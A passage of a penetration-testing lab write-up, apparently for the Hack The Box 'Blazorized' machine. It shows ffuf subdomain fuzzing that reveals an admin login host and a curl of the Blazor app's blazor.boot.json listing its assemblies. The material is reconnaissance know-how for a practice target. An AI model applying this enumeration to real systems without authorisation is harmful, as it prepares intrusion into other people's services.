+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>       /\ \__/ /\ \__/  __  __  /\ \__/       
+</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a>        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a>         \ \_\   \ \_\  \ \____/  \ \_\       
+</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a>          \/_/    \/_/   \/___/    \/_/       
+</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a>
+</span><span id="__span-1-10"><a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a>       v2.1.0-dev
+</span><span id="__span-1-11"><a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a>________________________________________________
+</span><span id="__span-1-12"><a id="__codelineno-1-12" name="__codelineno-1-12" href="#__codelineno-1-12"></a>
+</span><span id="__span-1-13"><a id="__codelineno-1-13" name="__codelineno-1-13" href="#__codelineno-1-13"></a> :: Method           : GET
+</span><span id="__span-1-14"><a id="__codelineno-1-14" name="__codelineno-1-14" href="#__codelineno-1-14"></a> :: URL              : http://blazorized.htb
+</span><span id="__span-1-15"><a id="__codelineno-1-15" name="__codelineno-1-15" href="#__codelineno-1-15"></a> :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/namelist.txt
+</span><span id="__span-1-16"><a id="__codelineno-1-16" name="__codelineno-1-16" href="#__codelineno-1-16"></a> :: Header           : Host: FUZZ.blazorized.htb
+</span><span id="__span-1-17"><a id="__codelineno-1-17" name="__codelineno-1-17" href="#__codelineno-1-17"></a> :: Follow redirects : false
+</span><span id="__span-1-18"><a id="__codelineno-1-18" name="__codelineno-1-18" href="#__codelineno-1-18"></a> :: Calibration      : false
+</span><span id="__span-1-19"><a id="__codelineno-1-19" name="__codelineno-1-19" href="#__codelineno-1-19"></a> :: Timeout          : 10
+</span><span id="__span-1-20"><a id="__codelineno-1-20" name="__codelineno-1-20" href="#__codelineno-1-20"></a> :: Threads          : 40
+</span><span id="__span-1-21"><a id="__codelineno-1-21" name="__codelineno-1-21" href="#__codelineno-1-21"></a> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+</span><span id="__span-1-22"><a id="__codelineno-1-22" name="__codelineno-1-22" href="#__codelineno-1-22"></a> :: Filter           : Response size: 144
+</span><span id="__span-1-23"><a id="__codelineno-1-23" name="__codelineno-1-23" href="#__codelineno-1-23"></a>________________________________________________
+</span><span id="__span-1-24"><a id="__codelineno-1-24" name="__codelineno-1-24" href="#__codelineno-1-24"></a>
+</span><span id="__span-1-25"><a id="__codelineno-1-25" name="__codelineno-1-25" href="#__codelineno-1-25"></a>admin                   [Status: 200, Size: 2047, Words: 149, Lines: 28, Duration: 39ms]
+</span><span id="__span-1-26"><a id="__codelineno-1-26" name="__codelineno-1-26" href="#__codelineno-1-26"></a>:: Progress: [151265/151265] :: Job [1/1] :: 1129 req/sec :: Duration: [0:01:47] :: Errors: 0 ::
+</span></code></pre></div>
+<p>Adding it to our <code>/etc/hosts</code> file and navigating to it we get access to the Super Admin login form.</p>
+<p><img alt="Blazorized-1.png" src="../images/Blazorized-1.png" /></p>
+<p>We can try some weak credentials, but to no avail. We will continue researching and enumerating about <code>Blazor</code> itself.</p>
+<h3 id="researching-enumerating-sensitive-files-in-blazor">Researching &amp; Enumerating Sensitive Files in Blazor<a class="headerlink" href="#researching-enumerating-sensitive-files-in-blazor" title="Permanent link">&para;</a></h3>
+<p>After doing some research about <code>Blazor</code> using the <a href="https://learn.microsoft.com/en-us/aspnet/core/blazor/?view=aspnetcore-9.0">Microsoft Docs</a>, we eventually come across the <code>blazor.boot.json</code> resource file, which contains a manifest of the files that make up the web application itself (see <a href="https://learn.microsoft.com/en-us/aspnet/core/blazor/host-and-deploy/webassembly-caching/?view=aspnetcore-9.0">here</a>). We also know through research on the documentation, that the static web assets are stored inside the <code>_framework</code> folder. Conveniently the <code>blazor.boot.json</code> is stored there as well and we <code>curl</code> it to the contents of it. This reveals the full list of <code>.dll</code> files used by the web application.</p>
+<div class="language-console highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="gp">$ </span>curl<span class="w"> </span>-s<span class="w"> </span><span class="s1">&#39;http://blazorized.htb/_framework/blazor.boot.json&#39;</span>
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="go">{</span>
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="go">  &quot;cacheBootResources&quot;: true,</span>
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a><span class="go">  &quot;config&quot;: [ ],</span>
+</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a><span class="go">  &quot;debugBuild&quot;: false,</span>
+</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a><span class="go">  &quot;entryAssembly&quot;: &quot;Blazorized.DigitalGarden&quot;,</span>
+</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a><span class="go">  &quot;icuDataMode&quot;: 0,</span>
+</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a><span class="go">  &quot;linkerEnabled&quot;: true,</span>
+</span><span id="__span-2-9"><a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a><span class="go">  &quot;resources&quot;: {</span>
+</span><span id="__span-2-10"><a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a><span class="go">    &quot;assembly&quot;: {</span>
+</span><span id="__span-2-11"><a id="__codelineno-2-11" name="__codelineno-2-11" href="#__codelineno-2-11"></a><span class="go">      &quot;Blazored.LocalStorage.dll&quot;: &quot;sha256-5V8ovY1srbIIz7lzzMhLd3nNJ9LJ6bHoBOnLJahv8Go=&quot;,</span>
+</span><span id="__span-2-12"><a id="__codelineno-2-12" name="__codelineno-2-12" href="#__codelineno-2-12"></a><span class="go">      &quot;Blazorized.DigitalGarden.dll&quot;: &quot;sha256-YH2BGBuuUllYRVTLRSM+TxZtmhmNitErmBqq1Xb1fdI=&quot;,</span>
+</span><span id="__span-2-13"><a id="__codelineno-2-13" name="__codelineno-2-13" href="#__codelineno-2-13"></a><span class="go">      &quot;Blazorized.Shared.dll&quot;: &quot;sha256-Bz\/iaIKjbUZ4pzYB1LxrExKonhSlVdPH63LsehtJDqY=&quot;,</span>
+</span><span id="__span-2-14"><a id="__codelineno-2-14" name="__codelineno-2-14" href="#__codelineno-2-14"></a><span class="go">      &quot;Markdig.dll&quot;: &quot;sha256-\/zBLNTAFSwzmj9Qq3hOzX4jN+IzlZOPHCL3qEU4t8BQ=&quot;,</span>
+</span><span id="__span-2-15"><a id="__codelineno-2-15" name="__codelineno-2-15" href="#__codelineno-2-15"></a><span class="go">      &quot;Microsoft.AspNetCore.Components.dll&quot;: &quot;sha256-q\/vMB0OEwpfgaAe0kahnXQUPQ5ux0ryaY2BXkF22E8Y=&quot;,</span>
+</span><span id="__span-2-16"><a id="__codelineno-2-16" name="__codelineno-2-16" href="#__codelineno-2-16"></a><span class="go">      &quot;Microsoft.AspNetCore.Components.Forms.dll&quot;: &quot;sha256-ilsozHMhNmrU5XRQkeYzpGDYHyLUQXPUW4Hh4D7ueZ4=&quot;,</span>
+</span><span id="__span-2-17"><a id="__codelineno-2-17" name="__codelineno-2-17" href="#__codelineno-2-17"></a><span class="go">      &quot;Microsoft.AspNetCore.Components.Web.dll&quot;: &quot;sha256-KWEr4EaQSjbTnpfqEN\/6Nl330iwzKzUAkJlJ1BpK\/MU=&quot;,</span>
+</span><span id="__span-2-18"><a id="__codelineno-2-18" name="__codelineno-2-18" href="#__codelineno-2-18"></a><span class="go">      &quot;Microsoft.AspNetCore.Components.WebAssembly.dll&quot;: &quot;sha256-Ej9bH2qZK\/yyvACie45LB5PgSAlH0sPfZjnHKyBY1MA=&quot;,</span>
+</span><span id="__span-2-19"><a id="__codelineno-2-19" name="__codelineno-2-19" href="#__codelineno-2-19"></a><span class="go">      &quot;Microsoft.Extensions.Configuration.Abstractions.dll&quot;: &quot;sha256-X\/f4fDl2cuIRXeWHhK\/f2UqQbFioD+RU4a4CEh0zrrQ=&quot;,</span>
+</span><span id="__span-2-20"><a id="__codelineno-2-20" name="__codelineno-2-20" href="#__codelineno-2-20"></a><span class="go">      &quot;Microsoft.Extensions.Configuration.dll&quot;: &quot;sha256-DBOKSPriP2JDxVbbWrLXyD3K4\/x3RBifNBWk\/q1I39M=&quot;,</span>
+</span><span id="__span-2-21"><a id="__codelineno-2-21" name="__codelineno-2-21" href="#__codelineno-2-21"></a><span class="go">      &quot;Microsoft.Extensions.Configuration.Json.dll&quot;: &quot;sha256-Q5AqJneA2TZnzC0IYzBx6j\/tHRhWAeMbpH3BsV7KgWg=&quot;,</span>
+</span><span id="__span-2-22"><a id="__codelineno-2-22" name="__codelineno-2-22" href="#__codelineno-2-22"></a><span class="go">      &quot;Microsoft.Extensions.DependencyInjection.Abstractions.dll&quot;: &quot;sha256-3dT6SSIGGrs8Me0BhM7OKQNnZgPiMpzxJxbKZg9+PPk=&quot;,</span>
+</span><span id="__span-2-23"><a id="__codelineno-2-23" name="__codelineno-2-23" href="#__codelineno-2-23"></a><span class="go">      &quot;Microsoft.Extensions.DependencyInjection.dll&quot;: &quot;sha256-qi0kE7rp0kdsNqdL6DyPZEeimjUGvcLT4iWQX0YnRus=&quot;,</span>
+</span><span id="__span-2-24"><a id="__codelineno-2-24" name="__codelineno-2-24" href="#__codelineno-2-24"></a><span class="go">      &quot;Microsoft.Extensions.Http.dll&quot;: &quot;sha256-rZWnWVD6nK+nRjxDQYWLF5GE9vGvT14HtIoM\/0PlVd0=&quot;,</span>
+</span><span id="__span-2-25"><a id="__codelineno-2-25" name="__codelineno-2-25" href="#__codelineno-2-25"></a><span class="go">      &quot;Microsoft.Extensions.Localization.Abstractions.dll&quot;: &quot;sha256-HmuAsUnHX2mxnAL703FjrEbwGneVw5Q96ZGBg3m7xEw=&quot;,</span>
+</span><span id="__span-2-26"><a id="__codelineno-2-26" name="__codelineno-2-26" href="#__codelineno-2-26"></a><span class="go">      &quot;Microsoft.Extensions.Localization.dll&quot;: &quot;sha256-oL+8vEgiohIU\/VOsIukfsaS53JGMyOPV5Grr6Zd6TSk=&quot;,</span>
+</span><span id="__span-2-27"><a id="__codelineno-2-27" name="__codelineno-2-27" href="#__codelineno-2-27"></a><span class="go">      &quot;Microsoft.Extensions.Logging.Abstractions.dll&quot;: &quot;sha256-+5dUbJ9ffsgK5RahPCQeMw5x76+LlE6F9dqvF2FoBHg=&quot;,</span>
+</span><span id="__span-2-28"><a id="__codelineno-2-28" name="__codelineno-2-28" href="#__codelineno-2-28"></a><span class="go">      &quot;Microsoft.Extensions.Logging.dll&quot;: &quot;sha256-Sezvu1SpB+vPfYWMQ+LQtRpFvN9Ym3AvPDnKYCKxL14=&quot;,</span>
+</span><span id="__span-2-29"><a id="__codelineno-2-29" name="__codelineno-2-29" href="#__codelineno-2-29"></a><span class="go">      &quot;Microsoft.Extensions.Options.dll&quot;: &quot;sha256-k9XISCK5fk9IUDDKqLl\/+QFebprK5dgTjSKpE\/Zpz8Q=&quot;,</span>
+</span><span id="__span-2-30"><a id="__codelineno-2-30" name="__codelineno-2-30" href="#__codelineno-2-30"></a><span class="go">      &quot;Microsoft.Extensions.Primitives.dll&quot;: &quot;sha256-eXvGx2jcjpTPEJoAHBsW\/VuMPbNyyU+AsuhPmkzSSRY=&quot;,</span>
+</span><span id="__span-2-31"><a id="__codelineno-2-31" name="__codelineno-2-31" href="#__codelineno-2-31"></a><span class="go">      &quot;Microsoft.IdentityModel.Abstractions.dll&quot;: &quot;sha256-a1daKYknMuF16uFadrwL8fjYxiN83JCr285kxf6l1SI=&quot;,</span>
+</span><span id="__span-2-32"><a id="__codelineno-2-32" name="__codelineno-2-32" href="#__codelineno-2-32"></a><span class="go">      &quot;Microsoft.IdentityModel.JsonWebTokens.dll&quot;: &quot;sha256-ZceT+VyXrVMCCQx7ghNz4BXbpCkOZwHTSkPikk1tYfg=&quot;,</span>
+</span><span id="__span-2-33"><a id="__codelineno-2-33" name="__codelineno-2-33" href="#__codelineno-2-33"></a><span class="go">      &quot;Microsoft.IdentityModel.Logging.dll&quot;: &quot;sha256-yUKJ+ALshaP1bgyC3HBJYhvWi8ZO89OQq1D6xzUcsjA=&quot;,</span>
+</span><span id="__span-2-34"><a id="__codelineno-2-34" name="__codelineno-2-34" href="#__codelineno-2-34"></a><span class="go">      &quot;Microsoft.IdentityModel.Tokens.dll&quot;: &quot;sha256-kci9vmm4cxzxjfLH7gBsdkuSD95idJws2K27ijmaMqg=&quot;,</span>
+</span><span id="__span-2-35"><a id="__codelineno-2-35" name="__codelineno-2-35" href="#__codelineno-2-35"></a><span class="go">      &quot;Microsoft.JSInterop.dll&quot;: &quot;sha256-3OzHtLOp\/ABrxbs+cwoO9uxU3d1YqRrcP6MgKAWKCOQ=&quot;,</span>
+</span><span id="__span-2-36"><a id="__codelineno-2-36" name="__codelineno-2-36" href="#__codelineno-2-36"></a><span class="go">      &quot;Microsoft.JSInterop.WebAssembly.dll&quot;: &quot;sha256-4cMfifCYL\/bv5qiC8T6HyABhOewZlTXovRc+E\/CrUbc=&quot;,</span>
+</span><span id="__span-2-37"><a id="__codelineno-2-37" name="__codelineno-2-37" href="#__codelineno-2-37"></a><span class="go">      &quot;MudBlazor.dll&quot;: &quot;sha256-BCkPqJ+DM7hJKpuUnFQY98YKaIwoRWyqzw8JkUBKQf0=&quot;,</span>
+</span><span id="__span-2-38"><a id="__codelineno-2-38" name="__codelineno-2-38" href="#__codelineno-2-38"></a><span class="go">      &quot;MudBlazor.Markdown.dll&quot;: &quot;sha256-6eL9fPi7IlrwF4XROmZgloTtnqKEqzak7Aew1tykYPI=&quot;,</span>
+</span><span id="__span-2-39"><a id="__codelineno-2-39" name="__codelineno-2-39" href="#__codelineno-2-39"></a><span class="go">      &quot;System.Collections.Concurrent.dll&quot;: &quot;sha256-VJZ+9mtVjI3oFnHaOcs7QQWwE1tpcmsn\/Fbf1ss51EE=&quot;,</span>
+</span><span id="__span-2-40"><a id="__codelineno-2-40" name="__codelineno-2-40" href="#__codelineno-2-40"></a><span class="go">      &quot;System.Collections.dll&quot;: &quot;sha256-PcqW0HOMhSsdhOuo97PP73z311WvAUQjMNlDxO0YNvg=&quot;,</span>
+</span><span id="__span-2-41"><a id="__codelineno-2-41" name="__codelineno-2-41" href="#__codelineno-2-41"></a><span class="go">      &quot;System.ComponentModel.Annotations.dll&quot;: &quot;sha256-p3FeLGazqadK+YWA5aMJEwKQP4\/CX0gumrfPLmaMmss=&quot;,</span>
+</span><span id="__span-2-42"><a id="__codelineno-2-42" name="__codelineno-2-42" href="#__codelineno-2-42"></a><span class="go">      &quot;System.ComponentModel.dll&quot;: &quot;sha256-Fk2YdbIh1S9I3Jn+elQpV9RdU2OqJiVenl74EbfuW34=&quot;,</span>
+</span><span id="__span-2-43"><a id="__codelineno-2-43" name="__codelineno-2-43" href="#__codelineno-2-43"></a><span class="go">      &quot;System.ComponentModel.Primitives.dll&quot;: &quot;sha256-f2JppNaTVR3r2YAWy4aA5vx0Ouy5xoW17tkOh8su2Wc=&quot;,</span>
+</span><span id="__span-2-44"><a id="__codelineno-2-44" name="__codelineno-2-44" href="#__codelineno-2-44"></a><span class="go">      &quot;System.ComponentModel.TypeConverter.dll&quot;: &quot;sha256-z8NaAg44tOD7RGtFlQNGs6GywkgWXfQxiH9IJyUJaBs=&quot;,</span>
+</span><span id="__span-2-45"><a id="__codelineno-2-45" name="__codelineno-2-45" href="#__codelineno-2-45"></a><span class="go">      &quot;System.Console.dll&quot;: &quot;sha256-Z0qITFiDb6P2gyaZV9Ku42+3y\/8YwgfrxLnEDp5E15s=&quot;,</span>
+</span><span id="__span-2-46"><a id="__codelineno-2-46" name="__codelineno-2-46" href="#__codelineno-2-46"></a><span class="go">      &quot;System.dll&quot;: &quot;sha256-GXYaTkUWqIcsGI6VKD2SIHDrRwOD2xQU1UA9nONh8PU=&quot;,</span>
+</span><span id="__span-2-47"><a id="__codelineno-2-47" name="__codelineno-2-47" href="#__codelineno-2-47"></a><span class="go">      &quot;System.Formats.Asn1.dll&quot;: &quot;sha256-V5AtfHy4i4TRClZ4wQZ7hPz5VgLdBCZQYasU5aJR9D0=&quot;,</span>
+</span><span id="__span-2-48"><a id="__codelineno-2-48" name="__codelineno-2-48" href="#__codelineno-2-48"></a><span class="go">      &quot;System.IdentityModel.Tokens.Jwt.dll&quot;: &quot;sha256-6UnGv5ruxREG0Pk32MuWFOFjcqcvYNuinJcJaBXPnRA=&quot;,</span>
+</span><span id="__span-2-49"><a id="__codelineno-2-49" name="__codelineno-2-49" href="#__codelineno-2-49"></a><span class="go">      &quot;System.IO.Compression.dll&quot;: &quot;sha256-6oQKWB3LN6lvKLNpYiIalauJCy2YonpZ7QBLAmoMCao=&quot;,</span>
+</span><span id="__span-2-50"><a id="__codelineno-2-50" name="__codelineno-2-50" href="#__codelineno-2-50"></a><span class="go">      &quot;System.Linq.dll&quot;: &quot;sha256-YuUMLuHQ4VWrIe8ecXrKp6f8BFkPKwTInHAFtRspY3A=&quot;,</span>
+</span><span id="__span-2-51"><a id="__codelineno-2-51" name="__codelineno-2-51" href="#__codelineno-2-51"></a><span class="go">      &quot;System.Linq.Expressions.dll&quot;: &quot;sha256-krU0mE+qHN23mrVgI0s\/99oAYEHtztkgJ59u0Uy+x6c=&quot;,</span>
+</span><span id="__span-2-52"><a id="__codelineno-2-52" name="__codelineno-2-52" href="#__codelineno-2-52"></a><span class="go">      &quot;System.Memory.dll&quot;: &quot;sha256-+MXdUexgKsH1w9XI5G8BWxuEY0tKIAD+xuE1kO1lYbA=&quot;,</span>
+</span><span id="__span-2-53"><a id="__codelineno-2-53" name="__codelineno-2-53" href="#__codelineno-2-53"></a><span class="go">      &quot;System.Net.Http.dll&quot;: &quot;sha256-5YDY3emMx3szDVfae1lDDlTPXH3VB1apmM8hECmSQR4=&quot;,</span>
+</span><span id="__span-2-54"><a id="__codelineno-2-54" name="__codelineno-2-54" href="#__codelineno-2-54"></a><span class="go">      &quot;System.Net.Http.Json.dll&quot;: &quot;sha256-CG\/PL04ZZqfHAYQdh\/5IJKbcNSUSDUXbz6ZYqyJ5cPM=&quot;,</span>
+</span><span id="__span-2-55"><a id="__codelineno-2-55" name="__codelineno-2-55" href="#__codelineno-2-55"></a><span class="go">      &quot;System.Net.Primitives.dll&quot;: &quot;sha256-eNUKNz+XLN5pHDhz0TRrSWVzwD7sT8fHO\/iPmRMMcmw=&quot;,</span>
+</span><span id="__span-2-56"><a id="__codelineno-2-56" name="__codelineno-2-56" href="#__codelineno-2-56"></a><span class="go">      &quot;System.ObjectModel.dll&quot;: &quot;sha256-rCCEEgfTj3ifxigXAW8vpXI2xDFjBeDcFTeEeQRCxGs=&quot;,</span>
+</span><span id="__span-2-57"><a id="__codelineno-2-57" name="__codelineno-2-57" href="#__codelineno-2-57"></a><span class="go">      &quot;System.Private.CoreLib.dll&quot;: &quot;sha256-duCS2lpNXrvF\/sII\/ROPczy30vEs54dkJG+WagUjwU8=&quot;,</span>
+</span><span id="__span-2-58"><a id="__codelineno-2-58" name="__codelineno-2-58" href="#__codelineno-2-58"></a><span class="go">      &quot;System.Private.Uri.dll&quot;: &quot;sha256-QUp9pgVKRli5\/xLQf5zWfHAD1KRUEi3RgO1D6HY2SHk=&quot;,</span>
+</span><span id="__span-2-59"><a id="__codelineno-2-59" name="__codelineno-2-59" href="#__codelineno-2-59"></a><span class="go">      &quot;System.Private.Xml.dll&quot;: &quot;sha256-ApyqBjTVBbNCyZJP0aNRxd1cJdyLNpElRVs622uuJ54=&quot;,</span>
+</span><span id="__span-2-60"><a id="__codelineno-2-60" name="__codelineno-2-60" href="#__codelineno-2-60"></a><span class="go">      &quot;System.Runtime.CompilerServices.Unsafe.dll&quot;: &quot;sha256-ioMG7tdGMQuJXQaFEifb58Wo9nhzQ138YPF3FjXFKso=&quot;,</span>
+</span><span id="__span-2-61"><a id="__codelineno-2-61" name="__codelineno-2-61" href="#__codelineno-2-61"></a><span class="go">      &quot;System.Runtime.dll&quot;: &quot;sha256-2oCgFx36GBC0xZjd1hl5ZQXxw8zwZ00R\/SxrGu6Qy\/4=&quot;,</span>
+</span><span id="__span-2-62"><a id="__codelineno-2-62" name="__codelineno-2-62" href="#__codelineno-2-62"></a><span class="go">      &quot;System.Runtime.InteropServices.dll&quot;: &quot;sha256-ZnOr3qdZamAmXJoClwtU11aePkDpbPGGRXGGVZq+qss=&quot;,</span>
+</span><span id="__span-2-63"><a id="__codelineno-2-63" name="__codelineno-2-63" href="#__codelineno-2-63"></a><span class="go">      &quot;System.Runtime.InteropServices.JavaScript.dll&quot;: &quot;sha256-K56cee2Wp0fFNOLSZjwAZWsvsexfPJ8Fc\/rP97RFSG0=&quot;,</span>
+</span><span id="__span-2-64"><a id="__codelineno-2-64" name="__codelineno-2-64" href="#__codelineno-2-64"></a><span class="go">      &quot;System.Runtime.Intrinsics.dll&quot;: &quot;sha256-RNcogVfdvH7r++k9\/Sbs9aGp2Tsky8bIOWUFHl+j4jo=&quot;,</span>
+</span><span id="__span-2-65"><a id="__codelineno-2-65" name="__codelineno-2-65" href="#__codelineno-2-65"></a><span class="go">      &quot;System.Runtime.Numerics.dll&quot;: &quot;sha256-+oHtVeVcUysD56UQYTTLJ3BnD9766uThPNHg700sxu0=&quot;,</span>
+</span><span id="__span-2-66"><a id="__codelineno-2-66" name="__codelineno-2-66" href="#__codelineno-2-66"></a><span class="go">      &quot;System.Security.Claims.dll&quot;: &quot;sha256-i6iOwZtEGi1jKX5BS7V4Kk8mECmyZ8l49ewkm9Ik64E=&quot;,</span>
+</span><span id="__span-2-67"><a id="__codelineno-2-67" name="__codelineno-2-67" href="#__codelineno-2-67"></a><span class="go">      &quot;System.Security.Cryptography.Algorithms.dll&quot;: &quot;sha256-RLpI4SG0X+BmJMzdnl6YDepqNNnezyDys3pyTGWlEkI=&quot;,</span>
+</span><span id="__span-2-68"><a id="__codelineno-2-68" name="__codelineno-2-68" href="#__codelineno-2-68"></a><span class="go">      &quot;System.Security.Cryptography.Cng.dll&quot;: &quot;sha256-\/p2zCahEBOv3gbqd9XHRwVrL\/fUq8tH43+kjm7i1J\/I=&quot;,</span>
+</span><span id="__span-2-69"><a id="__codelineno-2-69" name="__codelineno-2-69" href="#__codelineno-2-69"></a><span class="go">      &quot;System.Security.Cryptography.Csp.dll&quot;: &quot;sha256-5kZPZt\/Q7PijslxzV+248xs\/IheEIclYiOI+4XMCbLM=&quot;,</span>
+</span><span id="__span-2-70"><a id="__codelineno-2-70" name="__codelineno-2-70" href="#__codelineno-2-70"></a><span class="go">      &quot;System.Security.Cryptography.dll&quot;: &quot;sha256-A0EGy+fyvbI6PCM1gzdpr\/jNhfYS5deVqnMdth3sLWA=&quot;,</span>
+</span><span id="__span-2-71"><a id="__codelineno-2-71" name="__codelineno-2-71" href="#__codelineno-2-71"></a><span class="go">      &quot;System.Security.Cryptography.Encoding.dll&quot;: &quot;sha256-TLpkd3NtthEaWBqHHShAVwYUIf26TiT4fO86Hig94Js=&quot;,</span>
+</span><span id="__span-2-72"><a id="__codelineno-2-72" name="__codelineno-2-72" href="#__codelineno-2-72"></a><span class="go">      &quot;System.Security.Cryptography.Primitives.dll&quot;: &quot;sha256-JILevD8ua6+qLJj8fU9Xymuzm2vr701AQnCKSlCKLjE=&quot;,</span>
+</span><span id="__span-2-73"><a id="__codelineno-2-73" name="__codelineno-2-73" href="#__codelineno-2-73"></a><span class="go">      &quot;System.Security.Cryptography.X509Certificates.dll&quot;: &quot;sha256-Tt6t3gSGKhS6w1kcDylF6h1UA+FrRey75wv1Dr88Ctc=&quot;,</span>
+</span><span id="__span-2-74"><a id="__codelineno-2-74" name="__codelineno-2-74" href="#__codelineno-2-74"></a><span class="go">      &quot;System.Text.Encodings.Web.dll&quot;: &quot;sha256-lwzvCAdo+KGRqRiuotyXVHSbpe7fuNSGMM0OMK0VbPk=&quot;,</span>
+</span><span id="__span-2-75"><a id="__codelineno-2-75" name="__codelineno-2-75" href="#__codelineno-2-75"></a><span class="go">      &quot;System.Text.Json.dll&quot;: &quot;sha256-ZgCOtGviIgH5dm9k+o2H8tL+gga3BjBCdmpl16zI2Xs=&quot;,</span>
+</span><span id="__span-2-76"><a id="__codelineno-2-76" name="__codelineno-2-76" href="#__codelineno-2-76"></a><span class="go">      &quot;System.Text.RegularExpressions.dll&quot;: &quot;sha256-A0Xkv8sUH8DOBuAI5Jwc9XCl\/F4IeSM57\/tzPba6HEU=&quot;,</span>
+</span><span id="__span-2-77"><a id="__codelineno-2-77" name="__codelineno-2-77" href="#__codelineno-2-77"></a><span class="go">      &quot;System.Threading.dll&quot;: &quot;sha256-J1ieNAafmr6H5LOMxJMuRKh3LGKtmT2upEU\/c5tnt68=&quot;,</span>
+</span><span id="__span-2-78"><a id="__codelineno-2-78" name="__codelineno-2-78" href="#__codelineno-2-78"></a><span class="go">      &quot;System.Threading.Thread.dll&quot;: &quot;sha256-pLV9qpTnD4J45AaN\/Z3QTnTPFGQwMI4mFEJaij83X3Q=&quot;,</span>
+</span><span id="__span-2-79"><a id="__codelineno-2-79" name="__codelineno-2-79" href="#__codelineno-2-79"></a><span class="go">      &quot;System.Xml.ReaderWriter.dll&quot;: &quot;sha256-9yumv+5QaTSARQB46DStO9vcXQyA3cPvv74jAta3lQA=&quot;</span>
+</span><span id="__span-2-80"><a id="__codelineno-2-80" name="__codelineno-2-80" href="#__codelineno-2-80"></a><span class="go">    },</span>
+</span><span id="__span-2-81"><a id="__codelineno-2-81" name="__codelineno-2-81" href="#__codelineno-2-81"></a><span class="go">    &quot;extensions&quot;: null,</span>
+</span><span id="__span-2-82"><a id="__codelineno-2-82" name="__codelineno-2-82" href="#__codelineno-2-82"></a><span class="go">    &quot;lazyAssembly&quot;: {</span>
+</span><span id="__span-2-83"><a id="__codelineno-2-83" name="__codelineno-2-83" href="#__codelineno-2-83"></a><span class="go">      &quot;Blazorized.Helpers.dll&quot;: &quot;sha256-ekLzpGbbVEn95uwSU2BGWpjosCK\/fqqQRjGFUW0jAQQ=&quot;</span>
+</span><span id="__span-2-84"><a id="__codelineno-2-84" name="__codelineno-2-84" href="#__codelineno-2-84"></a><span class="go">    },</span>
+</span><span id="__span-2-85"><a id="__codelineno-2-85" name="__codelineno-2-85" href="#__codelineno-2-85"></a><span class="go">    &quot;libraryInitializers&quot;: null,</span>
+</span><span id="__span-2-86"><a id="__codelineno-2-86" name="__codelineno-2-86" href="#__codelineno-2-86"></a><span class="go">    &quot;pdb&quot;: null,</span>
+</span><span id="__span-2-87"><a id="__codelineno-2-87" name="__codelineno-2-87" href="#__codelineno-2-87"></a><span class="go">    &quot;runtime&quot;: {</span>
+</span><span id="__span-2-88"><a id="__codelineno-2-88" name="__codelineno-2-88" href="#__codelineno-2-88"></a><span class="go">      &quot;dotnet.7.0.15.x46e81vra7.js&quot;: &quot;sha256-MHuxwxeVFybuBBTAWeZrvoStZpW+H4ThSaRcFvrfqXM=&quot;,</span>
+</span><span id="__span-2-89"><a id="__codelineno-2-89" name="__codelineno-2-89" href="#__codelineno-2-89"></a><span class="go">      &quot;dotnet.timezones.blat&quot;: &quot;sha256-aHk3Pm2JXopn6UPLJtovAqIdIk8GyIMzGm450cli9UE=&quot;,</span>
+</span><span id="__span-2-90"><a id="__codelineno-2-90" name="__codelineno-2-90" href="#__codelineno-2-90"></a><span class="go">      &quot;dotnet.wasm&quot;: &quot;sha256-fMuaMGy\/7q8rXL+GyH9Gu04mJDwQ\/OSYXD9ezf+Fz4k=&quot;,</span>
+</span><span id="__span-2-91"><a id="__codelineno-2-91" name="__codelineno-2-91" href="#__codelineno-2-91"></a><span class="go">      &quot;icudt_CJK.dat&quot;: &quot;sha256-SZLtQnRc0JkwqHab0VUVP7T3uBPSeYzxzDnpxPpUnHk=&quot;,</span>
+</span><span id="__span-2-92"><a id="__codelineno-2-92" name="__codelineno-2-92" href="#__codelineno-2-92"></a><span class="go">      &quot;icudt_EFIGS.dat&quot;: &quot;sha256-8fItetYY8kQ0ww6oxwTLiT3oXlBwHKumbeP2pRF4yTc=&quot;,</span>
+</span><span id="__span-2-93"><a id="__codelineno-2-93" name="__codelineno-2-93" href="#__codelineno-2-93"></a><span class="go">      &quot;icudt_no_CJK.dat&quot;: &quot;sha256-L7sV7NEYP37\/Qr2FPCePo5cJqRgTXRwGHuwF5Q+0Nfs=&quot;,</span>
+</span><span id="__span-2-94"><a id="__codelineno-2-94" name="__codelineno-2-94" href="#__codelineno-2-94"></a><span class="go">      &quot;icudt.dat&quot;: &quot;sha256-tO5O5YzMTVSaKBboxAqezOQL9ewmupzV2JrB5Rkc8a4=&quot;</span>
